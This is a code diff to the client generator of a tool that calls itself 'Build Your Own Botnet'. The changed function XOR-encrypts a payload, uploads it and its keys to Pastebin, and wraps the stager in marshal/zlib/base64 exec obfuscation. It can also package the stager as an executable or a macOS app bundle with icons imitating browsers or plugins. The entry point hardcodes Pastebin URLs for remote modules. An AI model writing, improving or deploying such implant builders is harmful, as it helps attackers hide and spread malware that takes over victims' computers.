@@ -19,15 +19,11 @@ import argparse
 import subprocess
 
 # byob
-
-if os.name is 'nt':
+try:
     from modules import security, util
-else:
-    from . import security, util
+except:
+    from .modules import security, util
 
-
-class ClientError(Exception):
-    pass
 
 colorama.init(autoreset=True)
 
@@ -50,91 +46,90 @@ def exe(options, filename):
         _  = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
         return exe
     except Exception as e3:
-        raise ClientError('exe error: {}'.format(str(e3)))
+        util.debug('exe error: {}'.format(str(e3)))
 
 
 def app(options, filename):
-    try:
-        if sys.platform == 'darwin':
-            return exe(options, filename)
-        else:
-            iconFile        = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
-            version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
-            baseName        = os.path.basename(filename)
-            bundleName      = os.path.splitext(baseName)[0]
-            pkgPath         = os.path.join(basePath, 'PkgInfo')
-            appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
-            basePath        = os.path.join(appPath, 'Contents')
-            distPath 	    = os.path.join(basePath, 'MacOS')
-            rsrcPath        = os.path.join(basePath, 'Resources')
-            plistPath       = os.path.join(rsrcPath, 'Info.plist')
-            iconPath        = os.path.basename(iconFile)
-            executable      = os.path.join(distPath, filename)
-            bundleVersion   = '%s %s'  % (bundleName, version)
-            bundleIdentity  = 'com.%s' % bundleName
-            infoPlist       = open('resources/app.plist').read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
-            os.makedirs(distPath)
-            os.mkdir(rsrcPath)
-            with file(pkgPath, "w") as fp:
-                fp.write("APPL????")
-            with file(plistPath, "w") as fw:
-                fw.write(infoPlist)
-            os.rename(filename, os.path.join(distPath, baseName))
-            return appPath
+    try:        
+        iconFile        = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
+        version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
+        baseName        = os.path.basename(filename)
+        bundleName      = os.path.splitext(baseName)[0]
+        pkgPath         = os.path.join(basePath, 'PkgInfo')
+        appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
+        basePath        = os.path.join(appPath, 'Contents')
+        distPath 	    = os.path.join(basePath, 'MacOS')
+        rsrcPath        = os.path.join(basePath, 'Resources')
+        plistPath       = os.path.join(rsrcPath, 'Info.plist')
+        iconPath        = os.path.basename(iconFile)
+        executable      = os.path.join(distPath, filename)
+        bundleVersion   = '%s %s'  % (bundleName, version)
+        bundleIdentity  = 'com.%s' % bundleName
+        infoPlist       = open('resources/app.plist').read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
+        os.makedirs(distPath)
+        os.mkdir(rsrcPath)
+        with file(pkgPath, "w") as fp:
+            fp.write("APPL????")
+        with file(plistPath, "w") as fw:
+            fw.write(infoPlist)
+        os.rename(filename, os.path.join(distPath, baseName))
+        return appPath
     except Exception as e:
-        raise ClientError("app error: {}".format(str(e)))
+        util.debug("app error: {}".format(str(e)))
 
-def py(options, payload='resources/payload.py', stager='resources/stager.py', **kwargs):
-#    try:
+
+def py(options, payload='modules/payload.py', stager='modules/stager.py', **kwargs):
+
         with open(payload, 'r') as fp:
-            payload = '\n\n'.join([fp.read(), "if __name__ == '__main__':", "    payload = Payload()", "    payload.run(config={})".format(json.dumps(kwargs))])
-#        payload = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(payload, '', 'exec')), 9))))
+            payload = fp.read()
         color = colorama.Fore.RESET
-        name = 'byob_%s.py' % util.variable(3)
-        path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
+        name  = 'byob_%s.py' % util.variable(3)
+        path  = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
+        
         if options.name:
             name = options.name
             path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
+            
         if not path.endswith('.py'):
             path += '.py'
-        if options.encrypt:
-            key = os.urandom(8).encode('hex')
-            print(colorama.Fore.RESET + colorama.Style.BRIGHT + "Encrypting payload ({:,} bytes)...\n".format(len(payload)))
-            code = security.encrypt_xor(payload, key, block_size=8, key_size=16, num_rounds=32, padding='\x00')
-            diff = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
-            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
-            print(color + colorama.Style.DIM + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")))
-            payload = code
-            xor_key = util.pastebin(security.encrypt_xor(key, base64.b64decode('uuYGm6cUAIwup6kWybUOZw==')))
-            kwargs.update({"xor_key": xor_key})
-        url = util.pastebin(payload)
+
+        if options.repo:
+            payload = payload.replace('$REPO$', options.repo)
+            
+        key  = os.urandom(16)
+        _key = util.pastebin(base64.b64encode(key))
+        payload = payload.replace('$KEY$', _key)
+        code = security.encrypt_xor(payload, key, block_size=8, key_size=16, num_rounds=32, padding='\x00')
+        diff = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
+        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
+        print(color + colorama.Style.DIM + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")))
+        payload = code
+        new_url = util.pastebin(payload)
+        api_key = util.pastebin(security.encrypt_xor(kwargs.get('api_key'), base64.b64decode('uuYGm6cUAIwup6kWybUOZw==')))
+        xor_key = util.pastebin(security.encrypt_xor(key, base64.b64decode('uuYGm6cUAIwup6kWybUOZw==')))
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
-        print(color + colorama.Style.DIM + "    ({:,} bytes uploaded to: {}".format(len(payload), url).ljust(80 - len("[+] ")))
-        kwargs.update({'payload': url})
-        print(json.dumps(kwargs, indent=2))
-        raw_input('')
+        print(color + colorama.Style.DIM + "    ({:,} bytes uploaded to: {}".format(len(payload), new_url).ljust(80 - len("[+] ")))
+        kwargs.update({"payload": new_url, "xor_key": xor_key, "api_key": api_key})
         with open(stager, 'r') as fp:
-            stager = fp.read()
-        stager = '\n\n'.join([stager, "if __name__=='__main__':", "\t_=main(config={})".format(json.dumps(kwargs))])
-        if options.obfuscate:
-            code = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
-            diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
-            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
-            print(color + colorama.Style.DIM + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")))
-            stager = code
+            stager = fp.read() + "\nif __name__ == '__main__':\n    _ = main(config={})".format(json.dumps(kwargs))
+        code = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
+        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
+        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
+        print(color + colorama.Style.DIM + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")))
+        stager = code
         with file(path, 'w') as fp:
             fp.write(stager)
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
         print(color + colorama.Style.DIM + "    ({:,} bytes written to file: {})".format(len(stager), path).ljust(80 - len("[+] ")))   
         if options.type == 'exe':
             path = exe(options, path)
+        elif options.type == 'app':
+            path = app(options, path)
         return path
-#    except Exception as e:
-#        raise ClientError(str(e))
+
     
 def main(*args, **kwargs):
-#    try:
-        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\tClient Generator | Build Your Own Botnet\n")
+        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\tClient | Build Your Own Botnet\n")
         parser = argparse.ArgumentParser(prog='client.py', usage='client.py {py,exe,app} host port [options]', description="Client Generator (Build Your Own Botnet)", version='0.4.7')
         parser.add_argument('type', action='store', help='python, executable, app bundle', choices=['py','exe','app'])
         parser.add_argument('host', action='store', type=str, default='localhost', help='server IP')
@@ -142,12 +137,8 @@ def main(*args, **kwargs):
         parser.add_argument('--repo', action='store', help='base URL for remote imports')
         parser.add_argument('--name', action='store', help='output filename')
         parser.add_argument('--icon', action='store', help='java, flash, chrome, firefox, safari')
-        parser.add_argument('--obfuscate', action='store_true', default=False, help='obfuscate both payload and stager')
-        parser.add_argument('--encrypt', action='store_true', default=False, help='encrypt both payload and stager')
         options = parser.parse_args()
         return py(options, **kwargs)
-#    except Exception as e:
-#        parser.error(e)
 
 if __name__ == '__main__':
     main(**{"modules": "https://pastebin.com/raw/Z5z5cjny","api_key":"https://pastebin.com/raw/QPAJs08x"})
